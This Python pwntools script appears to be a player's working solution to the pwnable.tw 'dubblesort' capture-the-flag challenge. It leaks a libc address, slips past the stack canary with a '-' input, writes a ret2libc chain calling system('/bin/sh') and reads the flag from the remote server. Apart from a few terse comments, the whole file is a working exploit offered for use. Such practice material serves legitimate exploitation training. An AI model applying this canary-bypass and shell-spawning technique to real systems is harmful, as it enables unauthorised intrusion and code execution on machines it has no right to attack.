#!/usr/bin/env python3
from pwn import *

DWORD = 4
DUMMY = 0xdeadbeef

elf = ELF("./dubblesort_patched")
libc = ELF("./given/libc_32.so.6")
ld = ELF("./ld-2.23.so")

def conn():
    global libc
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10101)
    else:
        p = process([ld.path, elf.path], env={'LD_PRELOAD': libc.path})
    return p

def leak_libc_base():
    global libc
    # info: pwndbg
    num_dword_to_ret = (0x7c + DWORD + DWORD) // DWORD

    p = conn()
    if args.LEAK_D:
        gdb.attach(p, "b *main + 319") # b4 canary check

    p.recvuntil(b"What your name :")
    p.send(b"\x00" * 0x40)

    n = num_dword_to_ret + 8
    p.recvuntil(b"How many numbers do you what to sort :")
    p.sendline(str(n).encode())

    for i in range(n):
        msg = "Enter the {} number :".format(i).encode()
        p.recvuntil(msg)
        p.sendline(b"-")

    p.recvuntil(b"Result :\n", timeout=5)

    leaks = []
    for i in range(n):
        num = p.recvuntil(b" ")
        leaks.append(int(num.strip()))
    print([hex(addr) for addr in leaks])


    # objdump to find this
    main_ret_pattern = 0xf7000637 # if args.REMOTE else 0xf7000519
    index = 0
    for i, addr in enumerate(leaks):
        if addr & 0xff000fff == main_ret_pattern:
            index = i
    main_ret = leaks[index]
    print("leak:", hex(main_ret))

    # objdump the libc to find where main returns
    # keyword: libc_start_main or libc_start_call_main
    main_ret_offset = 0x18637
    libc_address = main_ret - main_ret_offset

    print("[LEAK] Done. Libc.base ==", hex(libc_address))
    p.close()
    return libc_address

def exploit():
    global libc
    p = conn()
    if args.D:
        gdb.attach(p, "b *main + 340")

    # info pwndbg
    num_dword_b4_canary = (0x7c - 0x1c) // DWORD
    num_dword_to_ret = (0x7c + DWORD + DWORD) // DWORD

    ropchain_dwords = [libc.symbols['system'],
                       libc.symbols['system'],
                       next(libc.search(b"/bin/sh\x00"))]
    print("ROP chain:", [hex(n) for n in ropchain_dwords])
    assert(ropchain_dwords == sorted(ropchain_dwords))

    p.recvuntil(b"What your name :")
    p.send(b"\x00" * 0x40)

    n = num_dword_to_ret + len(ropchain_dwords) - 1
    p.recvuntil(b"How many numbers do you what to sort :")
    p.sendline(str(n).encode())
    for i in range(n):
        msg = "Enter the {} number :".format(i).encode()
        p.recvuntil(msg)
        if i < num_dword_b4_canary:
            p.sendline(b"0")
        elif i == num_dword_b4_canary:
            p.sendline(b"-")
        elif i < num_dword_to_ret - 1:
            p.sendline(str(libc.address).encode())
        else:
            rop_index = i - num_dword_to_ret
            p.sendline(str(ropchain_dwords[rop_index]).encode())
            # p.sendline(str(0xffffbeef).encode())
    p.recvuntil(b"Result :\n", timeout=5)

    nums = []
    for i in range(n):
        num = p.recvuntil(b" ")
        nums.append(int(num.strip()))
    print([hex(n) for n in nums])

    # We should get a shell now
    if args.REMOTE:
        p.sendline(b"cat /home/dubblesort/flag")
        msg = p.recvrepeat(3)
        if len(msg) > 0:
            print("[Flag msg]:",msg)
            p.interactive()
    elif p.can_recv():
        msg = p.recvrepeat(2)
        if b"*** stack smashing detected ***" not in msg:
            p.interactive()
    p.close()

if __name__ == '__main__':
    libc_base = leak_libc_base()
    libc.address = libc_base
    if args.LEAK_D:
        quit()
    i = 0
    while True:
        print("[ROUND] No.{}".format(i))
        exploit()
        i += 1

    "ISSUE: SIGABRT"
